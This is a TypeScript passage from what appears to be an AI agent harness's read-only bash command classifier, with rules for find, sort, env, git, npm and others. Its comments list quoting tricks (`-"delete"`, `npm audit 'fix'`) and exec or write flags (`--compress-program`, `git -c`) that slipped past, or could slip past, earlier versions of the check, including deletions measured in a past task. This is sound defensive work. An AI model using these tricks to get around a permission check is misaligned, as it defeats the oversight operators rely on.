 *   - output:     `-o` / `--output` (see `isOutputWriteToken`).
 *   - exec:       `--compress-program=PROG` runs PROG on spill files.
 *   - temp write: `--temporary-directory=DIR` / `-T DIR` writes scratch
 *                 files to a caller-chosen path.
 * Short `-T` is detected like `-o`: any short cluster containing `o`
 * (output) or uppercase `T` (temp dir) is a write vector. This can
 * over-block a few benign size values (e.g. `-S2T`); over-blocking a
 * read is acceptable, under-blocking a write is not.
 */
function isSortWriteToken(raw: string): boolean {
  // Monotone BY CONSTRUCTION (review round 1, decision D3): testing
  // raw OR decoded means decoding can only ADD a match, never remove
  // one. The earlier shape (test the decoded value alone) was measured
  // to LOSE matches here, because these predicates exclude `--` by
  // construction and a token like `-"-out"=x` decodes out of the
  // cluster branch entirely.
  return checkSortWrite(raw) || checkSortWrite(decodeShellWord(raw));
}

function checkSortWrite(t: string): boolean {
  if (t === "--compress-program" || t.startsWith("--compress-program=")) return true;
  if (t === "--temporary-directory" || t.startsWith("--temporary-directory=")) return true;
  if (t === "--output" || t.startsWith("--output=")) return true;
  // Short flag or cluster: '-' (not '--') containing 'o' (output) or
  // uppercase 'T' (temp dir).
  return t.startsWith("-") && !t.startsWith("--") && /[oT]/.test(t.slice(1));
}

/**
 * Returns true when a token is a write flag for `file`.
 * `-C` / `--compile` writes a compiled magic-cache file (`<name>.mgc`).
 * Lowercase `-c` checks the magic file without writing; only uppercase
 * `C` triggers a write. Cluster detection: `-bC`, `-Cb`, and `-bCx`
 * all contain uppercase `C` after the leading dash and are write vectors.
 */
function isFileWriteToken(raw: string): boolean {
  // Monotone BY CONSTRUCTION (review round 1, decision D3): testing
  // raw OR decoded means decoding can only ADD a match, never remove
  // one. The earlier shape (test the decoded value alone) was measured
  // to LOSE matches here, because these predicates exclude `--` by
  // construction and a token like `-"-out"=x` decodes out of the
  // cluster branch entirely.
  return checkFileWrite(raw) || checkFileWrite(decodeShellWord(raw));
}

function checkFileWrite(t: string): boolean {
  if (t === "--compile" || t.startsWith("--compile=")) return true;
  // Short flag or cluster: single leading '-' (not '--'), containing
  // uppercase 'C'. Lowercase 'c' is intentionally not matched.
  return t.startsWith("-") && !t.startsWith("--") && t.slice(1).includes("C");
}

/**
 * Classify an already-tokenized, metachar-cleared argv. Factored out
 * of `isReadOnlyBashCommand` so the command-runner special cases
 * (`command` / `env`) can recurse on the residual underlying command
 * without re-parsing a reconstructed string.
 */
function classifyTokens(tokens: readonly string[]): boolean {
  const bin = tokens[0] ?? "";
  const sub = tokens[1] ?? "";

  if (SIMPLE_READ_ONLY_BINS.has(bin)) return true;

  // `command <cmd> ...` runs <cmd>, bypassing shell functions/aliases.
  // It is read-only ONLY if the command it wraps is read-only. Strip
  // `command`'s own option flags (`-p`, `-v`, `-V`, and any combined
  // short flags like `-pv`), then recurse-classify the residual argv.
  // Bare `command` (no residual) and the lookup-only forms `command
  // -v <name>` / `command -V <name>` (which print where a name
  // resolves without executing it) stay read-only.
  if (bin === "command") {
    let i = 1;
    let lookupOnly = false;
    for (; i < tokens.length; i += 1) {
      const t = tokens[i];
      if (t === undefined || !t.startsWith("-") || t === "--") break;
      if (/[vV]/.test(t)) lookupOnly = true;
    }
    if (i < tokens.length && tokens[i] === "--") i += 1;
    if (lookupOnly) return true;
    if (i >= tokens.length) return true; // bare `command`
    return classifyTokens(tokens.slice(i));
  }

  // `env [NAME=VALUE...] [flags] <cmd> ...` runs <cmd> in a modified
  // environment. It is read-only ONLY if the command it wraps is
  // read-only. Skip leading env-assignment tokens (`FOO=bar`) and
  // env's own flags, then recurse-classify the residual command. Bare
  // `env`, `env -u X`, `env FOO=bar` (no residual command, just prints
  // the environment) stay read-only.
  if (bin === "env") {
    let i = 1;
    while (i < tokens.length) {
      const t = tokens[i];
      if (t === undefined) break;
      // `env -S` / `--split-string` re-parses a string into a command:
      // forfeit read-only classification (fail closed).
      if ((ENV_SPLIT_STRING_FLAGS.test(t) || ENV_SPLIT_STRING_FLAGS.test(decodeShellWord(t)))) return false;
      if (t === "--") { i += 1; break; }
      if (ENV_VALUE_FLAGS.has(t)) { i += 2; continue; }
      if (ENV_LEADING_FLAGS.has(t)) { i += 1; continue; }
      // Long flag with a glued value (`--unset=NAME`, `--chdir=DIR`):
      // single token, skip it.
      if (t.startsWith("--") && t.includes("=")) { i += 1; continue; }
      // Short flag with a glued value (`-uNAME`, `-CDIR`): single
      // token, skip it.
      if (/^-[uC]./.test(t)) { i += 1; continue; }
      // `NAME=VALUE` environment assignment (no leading dash): skip.
      if (!t.startsWith("-") && /^[A-Za-z_][A-Za-z0-9_]*=/.test(t)) { i += 1; continue; }
      break;
    }
    if (i >= tokens.length) return true; // bare `env` / only assignments
    return classifyTokens(tokens.slice(i));
  }

  // `find` is read-only ONLY when none of its argv tokens are write
  // flags. Scan the whole argv: `-delete` / `-exec` / `-execdir` /
  // `-ok` / `-okdir` mutate the filesystem; `-fprint*` and `-fls`
  // write to operator-supplied paths without going through shell
  // redirection. If any such flag appears, fall through to block.
  if (bin === "find") {
    // Decode each token first: `-"delete"`, `-'delete'`, `-\delete`,
    // `-$'delete'` and `-de"lete"` are all the single argv entry `-delete`
    // to bash, and all five really deleted while classifying as read-only
    // (task fdee7d0f, measured with a canary file per form). Set membership
    // on the RAW token is what they defeated.
    return !tokens.slice(1).some((t) => (FIND_WRITE_FLAGS.has(t) || FIND_WRITE_FLAGS.has(decodeShellWord(t))));
  }

  // `sort` is read-only ONLY when none of its argv tokens are write or
  // exec flags: `-o`/`--output` (file output), `--compress-program`
  // (runs an arbitrary program on spill files), and
  // `-T`/`--temporary-directory` (scratch write). See `isSortWriteToken`
  // for the exact detection rules and why the enumeration must cover the
  // exec vector, not just output redirection.
  if (bin === "sort") {
    return !tokens.slice(1).some(isSortWriteToken);
  }

  // `tree` is read-only ONLY when none of its argv tokens are output
  // write flags: `-o FILE` / `--output=FILE` / `--output FILE`, or a
  // short-flag cluster containing lowercase `o` (e.g. `-rno`). tree has
  // no exec or temp-dir flags. See `isTreeWriteToken`.
  if (bin === "tree") {
    return !tokens.slice(1).some(isTreeWriteToken);
  }

  // `file` is read-only ONLY when none of its argv tokens are compile
  // flags. `-C` / `--compile` writes a compiled magic-cache file;
  // lowercase `-c` is benign (magic-file check). Any short cluster
  // containing uppercase `C` (e.g. `-bC`) is a write vector. See
  // `isFileWriteToken` for the exact detection rules.
  if (bin === "file") {
    return !tokens.slice(1).some(isFileWriteToken);
  }

  // `<bin> --version` / `<bin> --help` shape. Checked BEFORE the
  // per-binary branches so that `git --version`, `gh --version`,
  // `harness --version` all pass through this shape rather than
  // falling into the per-binary subcommand allowlists (which
  // intentionally don't list `--version` since it's not a
  // subcommand). Must be exactly two tokens to keep the surface
  // tight: `<bin> --version <thing>` could exfiltrate or mis-route.
  if (tokens.length === 2 && VERSION_OR_HELP_FLAGS.has(sub)) return true;

  // `GIT_READ_ONLY_BIN_RE` matches by BASENAME, restricted to bare `git` or
  // an ABSOLUTE path ending in `/git` (task 5b5d1022, review round 2,
  // MEDIUM finding — see that constant's own comment for why this is
  // NARROWER than `command-normalize.ts`'s `GIT_TOKEN_RE`). `mygit`,
  // `git-foo`, `gitk`, and any RELATIVE path (`./git`, `bin/git`) do NOT
  // match, so they fall through to the default `false` below.
  if (GIT_READ_ONLY_BIN_RE.test(bin)) {
    const argTokens = tokens.slice(1);

    // Rule 1 (CRITICAL): `-c` forfeits outright, wherever it appears in
    // the invocation. See `isGitConfigOverrideToken`'s own comment.
    if (hasMatchingToken(argTokens, isGitConfigOverrideToken)) return false;

    // Rule 2 (HIGH): `--exec-path[=<dir>]` forfeits outright. See
    // `isExecPathToken`'s own comment.
    if (hasMatchingToken(argTokens, isExecPathToken)) return false;

    // Rule 3a (HIGH): `--git-dir[=<dir>]` forfeits outright. See
    // `isGitDirToken`'s own comment.
    if (hasMatchingToken(argTokens, isGitDirToken)) return false;

    const subIdx = peelGitGlobalOptionNames(tokens, 1);
    if (subIdx === null) return false; // malformed global option: fail closed
    const gitSub = tokens[subIdx] ?? "";

    // Rule 3b (HIGH): `-C <dir>` relocates which repository the WHOLE
    // invocation targets. Keeping the headline case (`git -C /tmp status`)
    // working means `-C` cannot simply forfeit like `--git-dir` above —
    // instead, once it is present, the subcommand must fall in the
    // STRICT subset `GIT_STRICT_QUERY_SUBS` rather than the full
    // `GIT_READ_ONLY_SUBS`. See that constant's own comment for exactly
    // which four subcommands are excluded and why, and
    // `isRepoRelocatingToken`'s own comment for why `--work-tree` /
    // `--namespace` do NOT trigger this stricter subset.
    if (hasMatchingToken(argTokens, isRepoRelocatingToken)) {
      return GIT_STRICT_QUERY_SUBS.has(gitSub);
    }
    return GIT_READ_ONLY_SUBS.has(gitSub);
  }

  if (bin === "gh") {
    if (!GH_READ_ONLY_NOUNS.has(sub)) return false;
    const verb = tokens[2] ?? "";
    return GH_READ_ONLY_VERBS.has(verb);
  }

  if (bin === "harness") return HARNESS_READ_ONLY_SUBS.has(sub);

  if (bin === "npm") {
    // `--registry` (incl. the per-scope `--@scope:registry` form) /
    // `--userconfig` / `--globalconfig` redirect npm's network or config
    // lookups to an operator-unverified location; forfeit the read-only
    // classification for the whole npm invocation regardless of which
    // subcommand is used. See `NPM_REGISTRY_FLAG_RE` / `NPM_UNSCOPED_UNTRUSTED_FLAGS`
    // (and their docstring's stated limit — this is a CLI-token guard only,
    // it cannot see `.npmrc` or `npm_config_registry`).
    if (hasNpmUntrustedSourceFlag(tokens.slice(1))) return false;

    // `npm audit` (report) is read-only; `npm audit fix` mutates the
    // lockfile and node_modules. A token-equality denylist on `fix` is a
    // shell-quoting bypass waiting to happen: `npm audit "fix"`, `'fix'`,
    // `f''ix`, `fi"x"`, `$'fix'` all reach npm as the literal argument
    // `fix` (npm's own arg parsing, not ours, strips the quoting) while
    // none of those RAW tokens equals the string `"fix"`, so an
    // equality/`includes` check on the untouched argv silently passes them.
    // The fix is a POSITIVE shape instead: after `audit`, every remaining
    // token must either start with `-` (a flag) or be the literal verb
    // `signatures` (npm's other read-only audit arm); any other positional
    // token — quoted, glued, or a future subcommand this floor has not
    // reasoned about — forfeits the classification. This also fails closed
    // on ANY separated flag value (e.g. `npm audit --audit-level high`,
    // `npm audit --omit dev` — the value itself, `high` / `dev`, is a
    // positional token with no leading `-`), an acceptable, conservative
    // false negative; use the glued `--flag=value` form to stay floored.
    // Deliberately NOT blocked: `npm audit -fix` (single dash). Verified
    // npm 11.17.0 behavior: npm's arg parser does not recognize `-fix` as
    // the `fix` subcommand or as any known flag cluster — it errors
    // `Unknown cli config "--fix"` and falls back to the plain (read-only)
    // report. `startsWith("-")` correctly floors it; do not "fix" this into
    // a block without re-verifying npm's parser first.
    if (sub === "audit") {
      return tokens.slice(2).every((t) => t.startsWith("-") || t === "signatures");
    }
    return NPM_READ_ONLY_SUBS.has(sub);
  }

  return false;
}
